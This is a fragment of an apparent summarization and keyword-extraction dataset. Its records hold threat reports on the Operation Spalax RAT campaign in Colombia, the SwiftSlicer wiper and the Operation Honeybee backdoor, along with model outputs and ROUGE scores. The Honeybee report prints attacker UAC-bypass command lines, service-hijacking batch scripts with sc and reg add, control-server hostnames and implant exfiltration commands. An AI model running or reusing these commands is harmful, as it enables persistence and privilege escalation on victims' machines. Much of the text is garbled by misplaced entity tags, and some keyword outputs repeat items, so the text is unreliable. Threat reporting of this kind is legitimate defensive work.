Then it decrypts the array by doing a single- byte XOR operation , cycling through the key . After that , the array is gzip - decompressed and executed . Part of the code for the mentioned operations is shown in Figure [DATE] 17.8/15Figure [DATE] 17 . Code to decrypt and run the [ORDINAL] third - stage malwareThe [ORDINAL] third stage is in charge of decrypting and running the payload . The .NET packer known as CyaX is used to perform this task . The version of the packer used by the attackers is v4 , although they used v2 in some cases . Figure [CARDINAL] 18 shows the hardcoded configuration for [CARDINAL] one of their samples . Figure [CARDINAL] 18 . Hardcoded configuration in CyaX - Sharp packerThe decryption of the payload is based on XOR operations and is the same as the algorithm previously shown but with an extra step : the payload is [ORG] XORed with its [ORDINAL] first [CARDINAL] 16 bytes as a key . Once it \u2019s decrypted , it can be run in the same address space or injected into a different process , depending on the configuration.9/15This packer supports various anti - analysis operations such as disabling [PERSON] Windows [PERSON] Defender , checking for security products , and detecting virtual environments and sandboxes . The majority of the payloads for these droppers are njRAT , but we have also seen AsyncRAT . We saw Remcos in one of these droppers , but the code in the packer was different . Part of the main routine for the injection of the payload is shown in Figure [DATE] 19.Figure [DATE] 19 . Code for the last stage of a dropperWe have noticed that the configuration is contained in different variables . Values like # startup_method # or # bind # mean that the configuration was not set for those options . The payload is read from an encrypted resource and [ORG] XORed with a hardcoded password . The shellcode that performs the injection is contained in an array and is dynamically loaded . There are no anti - analysis checks or protection mechanisms . AutoIt droppersFor some of their droppers , the attackers have used an AutoIt packer that comes heavily obfuscated . Unlike the cases that were previously described , in this case the [ORDINAL] first - stage malware performs the injection and execution of the payload . It does so by using [CARDINAL] two shellcodes contained in the compiled AutoIt script : [CARDINAL] one to decrypt the payload and another to inject it into some process . The payload is constructed by concatenating several strings , as shown in Figure [CARDINAL] 20 . By inspecting the last [CARDINAL] two characters , we can see that the string is in reverse order.10/15The routine that decrypts the payload contains a small shellcode that is loaded with [PRODUCT] VirtualAlloc and executed . The decryption done by the shellcode is based on a single - byte XOR algorithm . The code that loads the shellcode is shown in Figure 21.Figure [CARDINAL] 20 . Concatenation of the payloadWe can see that the shellcode is stored encrypted . In fact , before deobfuscating the script , all strings were encrypted with this same XOR - based algorithm . The decryption routine used is shown in Figure [CARDINAL] 22.Figure [CARDINAL] 21 . Execution of shellcode to decrypt the payload11/15Figure [CARDINAL] 22 . Routine to decrypt stringsOnce the payload is decrypted , a shellcode with RunPE code is used to perform the injection . The shellcode is concatenated in the same manner as the payload and executed like the previous shellcode . To achieve persistence , a VBS script is created to execute a copy of the dropper ( which is renamed to aadauthhelper.exe ) . Then an Internet Shortcut ( .url ) file is created in the [PRODUCT] Startup folder to execute the script . The code that generates these files is shown in Figure [CARDINAL] 23.The dropper contains code that is not executed . It can : Figure [CARDINAL] 23 . Code for persistence in AutoIt droppers12/15Check for [ORG] VMware and [ORG] VirtualBox [ORG] Delete the dropper executable [PERSON] Run the dropper continuously [PERSON] Download and execute files Terminate if a \u201c Program Manager \u201d window is found Read a binary from its resource section , write it to disk and execute it [ORG] Modify the security descriptor ( [ORG] ACL ) for the injected processFor more information see this analysis by [PERSON] Morphisec where similar AutoIt droppers were used with [LOC] Frenchy shellcode . PayloadsThe payloads used in [GPE] Operation [GPE] Spalax are remote access trojans . These provide several capabilities not only for remote control , but also for spying on targets : keylogging , screen capture , clipboard hijacking , exfiltration of files , and the ability to download and execute other malware , to name a few . These RATs were not developed by the attackers . They are : [GPE] Remcos , sold online njRAT , leaked in underground forums AsyncRAT , open sourceThere is not a [CARDINAL] one - to - one relationship between droppers and payloads , as we have seen different types of droppers running the same payload and also a single type of dropper connected to different payloads . However , we can state that [ORG] NSIS droppers mostly drop [GPE] Remcos , while Agent Tesla and AutoIt packers typically drop njRAT.Remcos is a tool for remote control and surveillance . It can be purchased with a [DATE] six - [DATE] month license that includes updates and support . There is also a free version with limited functionalities . While the tool can be used for legitimate purposes , it is also used by criminals to spy on their victims . Most of the [NORP] Remcos samples used by this group are v2.5.0 Pro , but we have also seen all versions that were released since [DATE] September [DATE] 2019 , which may indicate that the attackers bought a license after [DATE] that [DATE] month and have been actively using the different updates that they received during their [DATE] six [DATE] month license period . Regarding njRAT , this group mostly uses [PERSON] v0.7.3 ( also known as the [ORG] Lime version ) . That version includes functionalities such as [ORG] DDoS or ransomware encryption , but only spy features such as keylogging are used by the attackers . For a more complete description of this version , refer to this [DATE] 2018 article by [ORG] Zscaler . Another njRAT version used by the attackers is v0.7d ( the \u201c green edition \u201d ) which is a simpler version focused on spying capabilities : keylogging , taking screenshots , access to webcam and microphone , uploading and downloading files , and executing other binaries . The final type of payload that we will mention is AsyncRAT . In all cases we have observed v0.5.7B , which can be found on [ORG] GitHub , has been used . The functionalities in this [ORG] RAT are similar to those in the previously mentioned RATs , which allow attackers to spy on their victims . Network infrastructureDuring our research we saw approximately 70 different domain names used for [ORG] C&C in [DATE] the [DATE] second [DATE] half [DATE] of [DATE] 2020 . This amounts to [CARDINAL] at [CARDINAL] least [CARDINAL] 24 [ORG] IP addresses . By pivoting on passive [ORG] DNS data for [ORG] IP addresses and known domain names , we found that the attackers have used [CARDINAL] at [CARDINAL] least [CARDINAL] 160 additional domain names since [DATE] 2019 . This corresponds to [CARDINAL] at [CARDINAL] least [CARDINAL] 40 further [ORG] IP addresses . They\u2019ve managed to operate at such scale by using [NORP] Dynamic [ORG] DNS services . This means that they have a pool of domain names ( and also register new ones on a regular basis ) that are dynamically assigned to [ORG] IP addresses . This way a domain name can be related to several [ORG] IP addresses over a period of time and [ORG] IP addresses can be related to many domain names . Most of the domain names we have seen were registered with Duck DNS , but they have also used DNS Exit for publicvm.com and linkpc.net subdomains . [PERSON] Regarding [PERSON] IP addresses , almost all of them are in [GPE] Colombia . Most are [ORG] IP addresses related to [NORP] Colombian ISPs : 60 % of them are [ORG] Telmex and 30 % EPM Telecomunicaciones ( Tigo ) . As it is highly unlikely that the criminals own so many residential [ORG] IP addresses , it is possible that they use some victims as proxies , or some vulnerable devices to forward communication to their real [ORG] C&C servers . Finally , a subset of the [ORG] IP addresses belongs to [ORG] Powerhouse [ORG] Management , a [ORG] VPN service provider . They are used in conjunction with DNS [PERSON] Exit subdomains . Similar findings can be found in this analysis by Lab52.ConclusionTargeted malware attacks against [NORP] Colombian entities have been scaled up since the campaigns that were described [DATE] last [DATE] year . The landscape has changed from a campaign that had a handful of [ORG] C&C servers and domain names to a campaign with very large and fast - changing infrastructure with [CARDINAL] hundreds of domain names used since [DATE] 2019 . Even though TTPs have seen changes , not only in13/15how malware is delivered in phishing emails but also in the RATs used , [CARDINAL] one aspect that remains the same is that the attacks are still targeted and focused on [NORP] Colombian entities , both in the public and private sectors . It should be expected that these attacks will continue in the region for a long time , so we will keep monitoring these activities . A comprehensive list of Indicators of Compromise ( IoCs ) and samples can be found in our GitHub repository . For any inquiries , or to make sample submissions related to the subject , contact us at threatintel@eset.com . MITRE ATT&CK techniquesNote : This table was built using version 7 of the MITRE ATT&CK framework . TacticInitial AccessIDNameDescriptionT1566.001 Phishing : SpearphishingAttachmentThe attackers have used emails with [ORG] PDF or [ORG] RTF files attached that contain a link to download malware . T1566.002 Phishing : SpearphishingLinkThe attackers have used emails with a link to download malware . ExecutionT1059.005 [ORG] Command and Scripting Interpreter : Visual BasicThe attackers have used droppers that dump VBS files with commands to achieve persistence . [ORG] T1059.003 [ORG] Command and ScriptingInterpreter : Windows Command ShellT1106Native APIThe attackers have used RATs that can launch a command shell for executing commands . The attackers have used API calls in their droppers , such as [ORG] CreateProcessA , [PERSON] WriteProcessMemory and [ORG] ResumeThread , to load and execute shellcode in memory . T1204.001 User Execution : MaliciousLinkThe attackers have attempted to get users to open a malicious link that leads to the download of malware . T1204.002 User Execution : MaliciousFileThe attackers have attempted to get users to execute malicious files masquerading as documents . Persistence T1547.001 Boot or Logon Initialization Scripts : Registry Run Keys / Startup [ORG] FolderThe attackers have used RATs that persist by creating a [PERSON] Run registry key or by creating a copy of the malware in the [PRODUCT] Startup folder . T1053.005 Scheduled Task / Job : Scheduled TaskThe attackers have used scheduled tasks in their droppers and payloads to achieve persistence . Privilege EscalationT1548.002 Abuse Elevation Control Mechanism : Bypass User Access ControlThe attackers have used RATs that implement [ORG] UAC bypassing . Defense EvasionT1140Deobfuscate / Decode [PERSON] Files or [ORG] InformationThe attackers have used various encryption algorithms in their droppers to hide strings and payloads . T1562.001 Impair Defenses : Disable orModify ToolsThe attackers have used CyaX packer , which can disable [PERSON] Windows [PERSON] Defender . T1070.004 Indicator Removal on Host : File DeletionT1112Modify RegistryT1027.002 Obfuscated Files orInformation : Software PackingT1027.003 Obfuscated Files orInformation : [ORG] SteganographyThe attackers have used malware that deletes itself from the system . The attackers have used RATs that allow full access to the [ORG] Registry , for example to clear traces of their activities . The attackers have used various layers of packers for obfuscating their droppers . The attackers have used packers that read pixel data from images contained in [ORG] PE files \u2019 resource sections and build the next layer of execution from the data . T1055.002 Process Injection : PortableExecutable InjectionThe attackers have used droppers that inject the payload into legitimate processes such as [ORG] RegAsm.exe , MSBuild.exe and more . [ORG] T1497.001 Virtualization / SandboxEvasion : System ChecksThe attackers have used droppers and payloads that perform anti- analysis checks to detect virtual environments and analysis tools . Credential AccessT1555.003 Credentials from PasswordStores : Credentials from Web [ORG] BrowsersThe attackers have used various RATs with modules that steal passwords saved in victim web browsers.14/15TacticIDNameDescriptionDiscoveryT1010Application Window DiscoveryThe attackers have used droppers and RATs that gather information about opened windows . T1083T1120File and Directory DiscoveryThe attackers have used various RATs that can browse file systems . Peripheral Device DiscoveryThe attackers have used njRAT , which attempts to detect if the victim system has a camera during the initial infection . T1057Process DiscoveryThe attackers have used various RATs with modules that show running processes . T1012T1018Query [ORG] RegistryThe attackers have used various RATs that can read the Registry . Remote System DiscoveryThe attackers have used njRAT , which can identify remote hosts on connected networks . T1518.001 Software Discovery : SecuritySoftware DiscoveryThe attackers have used droppers that check for security software present in a victim \u2019s computer . T1082T1016T1049T1033System Information DiscoveryThe attackers have used various RATs that gather system information such as computer name and operating system during the initial infection . System Network Configuration DiscoveryThe attackers have used various RATs that can collect the [ORG] IP address of the victim machine . System Network Connections DiscoveryThe attackers have used various RATs that can list network connections on a victim \u2019s computer . System Owner / User DiscoveryThe attackers have used various RATs that retrieve the current username during initial infection . [ORG] T1007System [ORG] Service [ORG] DiscoveryThe attackers have used various RATs that have modules to manage services on the system . T1021.001 Remote Services : [ORG] RemoteDesktop [ORG] ProtocolThe attackers have used various RATs that can perform remote desktop access . T1091Replication Through Removable MediaThe attackers have used njRAT , which can be configured to spread via removable drives . CollectionT1123Audio CaptureT1115Clipboard [PERSON] DataThe attackers have used various RATs that can capture audio from the system \u2019s microphone . The attackers have used various RATs that can access and modify data from the clipboard . T1005Data from Local [ORG] SystemThe attackers have used various RATs that can access the local file system and upload , download or delete files . T1056.001 [PERSON] Input [PERSON] Capture : [ORG] KeyloggingThe attackers have used various RATs that have keylogging capabilities . [CARDINAL] T1113Screen CaptureT1125Video [ORG] CaptureThe attackers have used various RATs that can capture screenshots of victim machines . The attackers have used various RATs that can access the victim \u2019s webcam . Command and [ORG] ControlT1132.001 [ORG] Data [ORG] Encoding : StandardEncodingThe attackers have used njRAT , which uses base64 encoding for [ORG] C&C traffic . [ORG] T1573.001 [ORG] Encrypted [ORG] Channel : Symmetric CryptographyThe attackers have used [PERSON] Remcos [PERSON] RAT , which uses RC4 for encrypting [ORG] C&C communications . T1095Non - Application Layer ProtocolThe attackers have used various RATs that use [ORG] TCP for [ORG] C&C communications . T1571Non - Standard PortThe attackers have used various RATs that communicate over different port numbers . Exfiltration Over C2 Channel The attackers have used various RATs that exfiltrate data over thesame channel used for C&C.ExfiltrationT104112 Jan 2021 - 11:30AM15/15", "generated_text": "the report; ESET; 2020; Colombian entities; energy; metallurgical; the attackers; remote access trojans; use; the use; malicious files; POST; emails; C&C servers; Powerhouse Management; IP addresses; the campaigns; similarities; the phishing emails; different targets; the same individuals; the attacks; network infrastructure; time; the group; RATs; C&C servers; APT; targets; data; the infrastructure; control; IP addresses; the IP address range; the activity; a lot; time; communication; the attacks; espionage; the wave; the target.", "ref_text": "<START-1>The PDF describes a series of ongoing malware attacks targeting Colombian government institutions and private companies, called Operation Spalax. The attackers use phishing emails containing malicious links or attachments to distribute remote access trojans (RATs) to victims. The RATs allow them to spy on targets by logging keystrokes, taking screenshots, accessing webcams/microphones, and exfiltrating documents. Three different RATs have been observed: Remcos, njRAT, and AsyncRAT. They are distributed via droppers packed with various obfuscation techniques to avoid detection. The droppers decrypt and execute the RAT payloads. The attackers have a large, dynamic infrastructure to hide their activities, including 24+ IP addresses and 70+ domain names registered with free dynamic DNS services since mid-2020. Most IPs are residential addresses in Colombia, likely compromised machines proxying traffic. The attacks are still active and expected to continue targeting Colombian entities. The attackers tailor phishing emails to targets using native Spanish and Colombian themes. While their motives appear to be cyber espionage, some targets like lotteries suggest possible cybercrime links too. In summary, the PDF provides an overview of the ongoing, targeted RAT attacks against Colombian entities using phishing and obfuscated droppers to distribute spyware, supported by a large, hidden network infrastructure. The threat actors are persistent and expected to continue intrusion attempts in the region. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4897025171624714, "gpt3/lexical/rouge_rouge2": 0.1839080459770115, "gpt3/lexical/rouge_rougeL": 0.251716247139588, "gpt3/lexical/rouge_rougeLsum": 0.251716247139588, "gpt3_generated_text": ["In 2020, ESET observed ongoing targeted malware attacks in Colombia, specifically targeting government institutions and private companies in the energy and metallurgical sectors. The attackers use remote access trojans (RATs) to spy on their victims and have a large network infrastructure for command and control, with at least 24 different IP addresses and 70 domain names active. The attacks share similarities with previous reports about groups targeting Colombia, but also have differences, making attribution difficult. The phishing emails used in the attacks have similar topics and pretend to come from entities like the Office of the Attorney General and the National Directorate of Taxes and Customs. The attackers use linkpc.net and publicvm.com subdomains, along with IP addresses belonging to Powerhouse Management, for their C&C servers. The attacks involve the download of malicious files through emails, with the downloaded files being RAR archives containing an executable file. The attackers use different RATs, including Remcos, njRAT, and AsyncRAT, to gain remote access to the victim's computer. The phishing emails cover various topics and are not specifically tailored to the victims. The attackers show a good understanding of the Spanish language and exclusively target Colombian entities, using premade malware instead of developing their own. The article highlights the ongoing nature of the attacks and the challenges in attribution and defense against them."]}, {"split_name": "val", "sample_id": "val_130", "prompt_text": "Extract the keywords: ESET Research   ESETresearch#BREAKING On [DATE] January [DATE] 25th # [MONEY] ESETResearch discovered a new cyberattack in [GPE] Ukraine . Attackers deployed a new wiper we named # [ORG] SwiftSlicer using [ORG] Active [ORG] Directory [ORG] Group [ORG] Policy . The # [MONEY] SwiftSlicer wiper is written in Go programing language . We attribute this attack to # [ORG] Sandworm . [TIME] 1/32:12 [TIME] PM \u00b7 Jan 27 , [DATE] 2023 \u00b7 [CARDINAL] 116KViews240Retweets13Quote Tweets441Likes \u00b7 [ORG] ESETresearch [ORG] Jan [ORG] 27ESET Research Replying to   [ORG] ESETresearch [ORG] Once executed it deletes shadow copies , recursively overwrites files located in % CSIDL_SYSTEM%\\drivers , % CSIDL_SYSTEM_DRIVE%\\Windows\\NTDS and other non - system drives and then reboots computer . For overwriting it uses 4096 bytes length block filled with randomly generated byte [CARDINAL] 2/3113446,700ESET Research IoCs : [DATE] ESETresearch [DATE] Jan [DATE] 27\u00b77346E2E29FADDD63AE5C610C07ACAB46B2B1B176ESET Detection names : WinGo / KillFiles . C trojan [CARDINAL] 3/3111415,657", "generated_text": "Ukraine; the attackers; a new wiper; SwiftSlicer; Active Directory Group Policy; Sandworm; Active Directory; a system drive; files; % CSIDL_SYSTEM%drivers; % CSIDL_SYSTEM_DRIVE%WindowsNTDS; other non-system drives; overwrites; files; % CSIDL_SYSTEM_DRIVE%WindowsNTDS; other non-system drives; a random generation; 4096 bytes; random generated byte; WinGo/KillFiles.", "ref_text": "<START-1>On January 25th, 2023, ESET researchers discovered a new cyberattack deploying a wiper malware named SwiftSlicer in Ukraine. The attackers used Active Directory Group Policy to distribute the SwiftSlicer wiper, which is written in the Go programming language. ESET attributes this attack to the Sandworm threat actor group. Once executed, SwiftSlicer deletes shadow copies, recursively overwrites files in specific system folders like %CSIDL_SYSTEM%\\drivers and %CSIDL_SYSTEM_DRIVE%\\Windows\\NTDS, as well as files on non-system drives. It overwrites files using a 4,096 byte block filled with random bytes. After overwriting files, it reboots the computer. ESET provided the following indicators of compromise: - SHA256 hash: 7346E2E29FADDD63AE5C610C07ACAB46B2B1B176 - Detection names: WinGo/KillFiles.C trojan This analysis shows Sandworm has developed a new wiper malware named SwiftSlicer, written in Go, and deployed it in a cyberattack against Ukraine in January 2023. The wiper is designed to recursively overwrite critical system files and folders before rebooting the system to render it inoperable. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.640926640926641, "gpt3/lexical/rouge_rouge2": 0.3968871595330739, "gpt3/lexical/rouge_rougeL": 0.525096525096525, "gpt3/lexical/rouge_rougeLsum": 0.525096525096525, "gpt3_generated_text": ["On January 25th, ESET Research discovered a new cyberattack in Ukraine where attackers used Active Directory Group Policy to deploy a new wiper called SwiftSlicer. The wiper, written in the Go programming language, is attributed to the Sandworm group. Once executed, SwiftSlicer deletes shadow copies and recursively overwrites files located in various directories, including % CSIDL_SYSTEM% drivers and % CSIDL_SYSTEM_DRIVE% Windows NTDS. It then reboots the computer. The overwriting process uses a 4096-byte length block filled with randomly generated bytes. ESET has provided IoCs (Indicators of Compromise) and detection names for this attack, including WinGo/KillFiles."]}, {"split_name": "val", "sample_id": "val_131", "prompt_text": "Extract the keywords: ( url\uf002\uf0e1\uf09a\uf099 \uf0d5 \uf09eMcAfee [ORG] Uncovers [ORG] Operation [ORG] Honeybee , a Malicious Document Campaign Targeting Humanitarian Aid GroupsBy [PERSON] Ryan [PERSON] Sherstobito   ( url / ) on [DATE] Mar 02 , [DATE] 2018 ( url post was written with contributions from [PERSON] Jessica Saavedra - Morales , [PERSON] Thomas [PERSON] Roccia , and [PERSON] Asheer [PERSON] Malhotra . McAfee Advanced Threat Research analysts have discovered a new operation targeting humanitarian aid organizations and using [NORP] North [NORP] Korean political topics as bait to lure victims into opening malicious [ORG] Microsoft [ORG] Word documents . Our analysts have named [ORG] this [ORG] Operation [ORG] Honeybee , based on the names of the malicious documents used in the attacks . [ORG] Advanced [ORG] Threat [ORG] Research analysts have also discovered malicious documents authored by the same actor that indicate a tactical shift . These documents do not contain the typical lures by this actor , instead using Word compatibility messages to entice victims into opening them . [ORG] The [ORG] Advanced [ORG] Threat [ORG] Research team also observed a heavy concentration of the implant in [GPE] Vietnam from [DATE] January [DATE] 15\u201317.BackgroundOn [DATE] January [DATE] 15 , [ORG] Advanced [ORG] Threat [ORG] Research discovered an operation using a new variant of the SYSCON backdoor . ( url The [NORP] Korean - language Word document manual.doc appeared in [GPE] Vietnam on [DATE] January [DATE] 17 , with the original author name of [ORG] Honeybee . Document properties . This malicious document contains a [ORG] Visual [ORG] Basic macro that dropped and executed an upgraded version of the implant known as [ORG] SYSCON , which appeared in [DATE] 2017 in malicious Word documents as part of several campaigns using [GPE] North [GPE] Korea \u2013 related topics . The malicious [PERSON] Visual [PERSON] Basic script uses a unique key ( custom alphabet ) to encode data . We have seen this in previous operations using [ORG] SYSCON . This key was also used in the [ORG] Honeybee campaign and appears to have been used since [DATE] August [DATE] 2017.Examples of decoy documents . Several additional documents surfaced [DATE] between [DATE] January [DATE] 17 [DATE] and [DATE] February [DATE] 3 . All contain the same [PERSON] Visual [PERSON] Basic macro code and author name as [ORG] Honeybee . Some of the malicious documents were test   les without the implant . From our analysis , most these documents were submitted from [GPE] South [GPE] Korea , indicating that some of the targeting was in [GPE] South [GPE] Korea . These [ORG] Honeybee documents did not contain any speci c lures , rather variations of a \u201c not compatible \u201d message attempting to convince the user to enable content . We also observed a related malicious document created [DATE] January [DATE] 12 by the author [PERSON] Windows [PERSON] User that contained a di erent encoding key , but essentially used the same macro and same type of implant as we saw with the recent [ORG] Honeybee documents . This document , \u201c [WORK_OF_ART] International [WORK_OF_ART] Federation [WORK_OF_ART] of [WORK_OF_ART] Red [WORK_OF_ART] Cross and Red Crescent Societies \u2013 DPRK Country O ce , \u201d drops an implant with the control server address [CARDINAL] 1113427185.ifastnet.org , which resolves to the same server used by the implants dropped in the [ORG] Honeybee case . The directory contents of control server [CARDINAL] 1113427185.ifastnet.org . The directory contents of ftp.byethost11.com , from [ORG] Honeybee samples . Log   les of compromised machines from [DATE] February [DATE] 2018 Honeybee samples . [ORG] MaoCheng [ORG] DropperAside from   nding the malicious documents , [ORG] the [ORG] Advanced [ORG] Threat [ORG] Research team discovered a Win32 - based executable dropper . This dropper uses a stolen digital signature from [ORG] Adobe [ORG] Systems . This certi cate is also used by another Korean- program database ( [ORG] PDB ) path . D:\\Task\\DDE Attack\\MaoCheng\\Release\\Dropper.pdbThe malware is a Win32 executable that pretends to be a Word document based on its icon . This is a dropper for the same type of malware as observed with the other Word documents . This sample also dropped a decoy document with the author name [ORG] Honeybee . This sample , however , contained a bug that interfered with the execution   ow of the dropper , suggesting that the authors did not test the malware after code signing it . The decoy document uses the cloud - based accounting software company [PERSON] Xero as a lure : A decoy document from [ORG] MaoCheng dropper . Possible OperatorThe Advanced Threat Research team has identi ed the following persona ( snoopykiller@mail.ru ) tied to this recent operation . Based on our analysis , the actor registered [CARDINAL] two free hosting accounts : [ORG] navermail.byethost3.com , which refers to the popular [NORP] South [NORP] Korean search engine , and nihon.byethost11.com . The email address was used to register a free account for a control server in all the implants described in our analysis . Technical [ORG] AnalysisLet \u2019s start with an overview of the attack : We continue with the components involved in this operation . The malicious Word   le is the beginning of the infection chain and acts as a dropper for [CARDINAL] two [ORG] DLL   les . The Word   le contains malicious [PERSON] Visual [PERSON] Basic macro code that runs when the document is opened in [PERSON] Word using the Document_Open ( ) autoload function . The word   le also contains a Base64 - encoded   le ( encoded with a custom key ) in it that is read , decoded , and dropped to the disk by the macro . The Document_Open ( ) subroutine implementing the malicious functionality . The Visual Basic macro performs the following tasks : Opens a handle to the malicious document to read the encoded [ORG] CAB   le [PERSON] Decodes the [ORG] CAB   le and writes it to the disk at % temp%\\setup.cabEncoded [ORG] CAB   le in the Word document . Decoding and writing the [ORG] CAB   le to % temp%.The decoded [ORG] CAB   le in the Visual Basic memory bu er . The [ORG] CAB   le contains the following   les and functions : dll : A malicious [ORG] DLL used to launch batch   les ( used with cliconfg.exe for [ORG] UAC bypass ) . The [ORG] DLL contains the following [ORG] PDB path : [ORG] D:\\Task\\MiMul\\NTWDBLIB\\Release\\NTWDBLIB.pdb . bat : A batch   le to set up the service [ORG] COMSysApp , for an x64 system bat : A batch   le to set up the service [ORG] COMSysApp , for an x86 system ini : A data   le with Base64 - encoded data for connecting to an [ORG] FTP server . Credentials are encoded in the .ini   le . Decoded credential data contained in ipnet.ini.dll : The malicious [ORG] DLL   le run as a service ( using svchost.exe ) . The [ORG] DLL contains the following [ORG] PDB path : D:\\Task\\MiMul\\FTPCom_vs10\\Release\\Engine.pdb . The macro then extracts the [ORG] CAB   le into % systemroo%\\system32 , using either wusa.exe or expand.exe ( depending on the OS ) to again bypass [ORG] UAC prompts Once the   les have been extracted , the Visual Basic macro deletes the [ORG] CAB   le and runs the malicious [NORP] NTWDBLIB.dll via cliconfg.exe ( to gain privileges and bypass [ORG] UAC protections ) Command lines used by the Visual Basic macro : cmd /c wusa % TEMP%\\setup.cab /quiet /extract:%SystemRoot%\\System32 & & [ORG] del /f /q % TEMP%\\setup.cab & & [ORG] cliconfg.exe cmd /c expand % TEMP%\\setup.cab -F :* % SystemRoot%\\System32 & & [ORG] del /f /q % TEMP%\\setup.cab & & [ORG] cliconfg.exe A combination of [ORG] NTWDBLIB.dll and cliconfg.exe are used to bypass [ORG] UAC protections ; this is a familiar attack on Windows . UAC bypass via [ORG] DLL hijacking requires : A [PRODUCT] Windows executable with the auto - elevate property in its manifest A [PRODUCT] Windows executable in a secure directory ( % systemroot%\\system32)The malicious [ORG] NTWDBLIB [ORG] DLL performs the simple task of setting up the malicious ipnet.dll as a service by running [CARDINAL] one of the [CARDINAL] two batch   les contained in the [ORG] CAB   le ( which is also dropped to % systemroot%\\system32):NTWDBLIB executing the installer batch   les under the context of [GPE] cliconfg.exe . The batch   les involved in the attack modify the system service COMSysApp to load the malicious ipnet.dll . The contents of the batch   les vary depending on the OS ( x64 vs [PERSON] x86):install1.bat ( [PERSON] x64)@echo o   sc stop COMSysApp sc con g COMSysApp type= own start= auto error= normal binpath= \" % windir%\\SysWOW64\\svchost.exe -k COMSysApp \" reg add \" HKLM\\SOFTWARE\\Microsoft\\Windows [NORP] NT\\CurrentVersion\\SvcHost \" /v [ORG] COMSysApp /t REG_MULTI_SZ /d \" COMSysA reg add \" HKLM\\SYSTEM\\CurrentControlSet\\Services\\COMSysApp\\Parameters \" /v [ORG] ServiceDll /t REG_EXPAND_SZ /d \" % windir% sc start COMSysApp del /f /q % windir%\\SysWOW64\\install2.bat del /f /q % windir%\\SysWOW64\\install1.batinstall2.bat ( [ORG] x86)@echo o   sc stop COMSysApp sc con g COMSysApp type= own start= auto error= normal binpath= \" % windir%\\System32\\svchost.exe -k COMSysApp \" reg add \" HKLM\\SOFTWARE\\Microsoft\\Windows [NORP] NT\\CurrentVersion\\SvcHost \" /v [ORG] COMSysApp /t REG_MULTI_SZ /d \" COMSysA reg add \" HKLM\\SYSTEM\\CurrentControlSet\\Services\\COMSysApp\\Parameters \" /v [ORG] ServiceDll /t REG_EXPAND_SZ /d \" % windir% sc start COMSysApp del /f /q % windir%\\System32\\install1.bat del /f /q % windir%\\System32\\install2.batThe batch   les perform these tasks : Stop the service COMSysApp Con gure the service to autostart ( to set up persistence on the system ) Modify registry keys to launch the [ORG] DLL unser svchost.exe Specify the malicious [ORG] DLL path to be loaded into the svchost process . Immediately restart the service Remove the batch   les to reduce the   ngerprint on the systemIPNet.dll runs as a service under svchost.exe . The malicious [ORG] DLL is also responsible for terminating the cliconfg.exe process and deleting the malicious [ORG] NTWDBLIB.dll [ORG] Base64 - decoding scheme with a di erent custom key . This document was created [DATE] January [DATE] 10.Contents of the decoy document . This variant also consists of [CARDINAL] two [ORG] CAB   les that are dropped to % temp% , depending on the OS ( x86 or x64).The key di erences in this variant : [CARDINAL] Two [ORG] CAB   les are encoded into the Word document in text boxes instead of being appended in the [ORG] DOC   le There is [CARDINAL] one [ORG] CAB   le for an x86 system and another for an x64 system This malware sample uses uacme.exe with dummy.dll to implement the [ORG] UAC bypassexe is the program vulnerable to the [ORG] UAC bypass attack dll runs install.bat to set up the service ( same as NTWDBLIB.dll)exe and dummy.dll may be either [CARDINAL] 64 - bit or 32 - bit binaries based on the OS . [ORG] Ipnet.dll may also be either [CARDINAL] 64 - bit or 32 - bit . The Visual Basic macro uses the following command line : cmd /c expand % TEMP%\\setup.cab -F :* % [ORG] TEMP% & & cd /d % [ORG] TEMP% & & [ORG] del /f /q [ORG] setup.cab & & uacme.exeThe control server credential information contained in the [ORG] CAB   les is di erent : Decoded credential data contained in another ipnet.ini . Similarities between this variant and the original malware sample : Service name is the same : COMSysApp The [ORG] DLL and ini   les contain the same functions as described elsewhere in this postData [ORG] ReconnaissanceThe following information is gathered from the endpoint and sent to the control server . System info : Computer name System info using : cmd /c systeminfo > % temp%\\temp.ini List of currently running process using : cmd /c tasklist > % temp%\\temp.iniEx ltrationThe data ex ltration process runs in the following sequence : The temp.ini   les are copied into a text   le that matches the pattern : From < COMPUTER - NAME > ( < Month>-<Day > < [ORG] Hour>-<Minute>-<Second>).txt . For example , From < COMPUTER - NAME > ( 01- [CARDINAL] 04 11 - 40 - 02).txtAll the text   les are now packed into the archive temp.zip ( % temp%\\temp.zip ) zip is [PERSON] Base64 encoded ( with a custom key , same as that used in the malicious document ) and then copied to post.txt txt is uploaded to the control serverAdditional [ORG] Commands and [ORG] CapabilitiesThe service - based [ORG] DLL implant traverses to the /htdocs/ directory on the [ORG] FTP server and looks for any   les with the keywords : TO EVERYONE : Commands issued to all infected endpoints TO < COMPUTERNAME > : [ORG] Commands issued to endpoints matching the ComputerNameThe following commands are supported by the malware implant : cmd /c pull < lename > : Adds   lename to temp.zip , [PERSON] Base64 encodes , and uploads to control server cmd /c chip < string > : Deletes current ipnet.ini con g   le . Writes new con g info ( control server connection info ) to new ipnet.ini . cmd /c put < new _ le_name > < existing _ le_name > : Copies existing   le to new   le name . Deletes existing   le . /user < parameters > : Executes downloaded   le with parameters speci ed using [PRODUCT] CreateProcessAsUser cmd /c < command > : Executes command on infected endpointConclusionThe actor behind [ORG] Honeybee has been operating with new implants since [DATE] at [DATE] least [DATE] November [DATE] 2017 with the   rst known version of [ORG] NTWDBLIB installer . Furthermore , based on the various metadata in both documents and executables , the actor is likely a [NORP] Korean speaker . The techniques used in the malicious documents such as the lure messages closely resemble what we have observed before in [GPE] South [GPE] Korea . The attacker appears to target those involved in humanitarian aid and inter - [NORP] Korean a airs . We have seen this operation expand beyond the borders of [GPE] South [GPE] Korea to target [GPE] Vietnam , [GPE] Singapore , [GPE] Argentina , [GPE] Japan , [GPE] Indonesia , and [GPE] Canada . Based on [ORG] the [ORG] McAfee [ORG] Advanced [ORG] Threat [ORG] Research team \u2019s analysis , we   nd multiple components from this operation are unique from a code perspective , even though the code is loosely based on previous versions of the SYSCON backdoor . Some new droppers have not been observed before in the wild . The [PERSON] MaoCheng dropper was apparently created speci cally for this operation and appeared only twice in the wild . Indicators of compromiseMITRE [PERSON] ATT&CK techniquesModify existing service [ORG] Deobfuscate / decode   les or information [PRODUCT] System information discovery [ORG] Command - line [ORG] Interface [ORG] Data from local system Automated ex ltration [ORG] Data encrypted [ORG] Commonly used port ftp.byethost11.com [CARDINAL] 1113427185.ifastnet.org navermail.byethost3.com 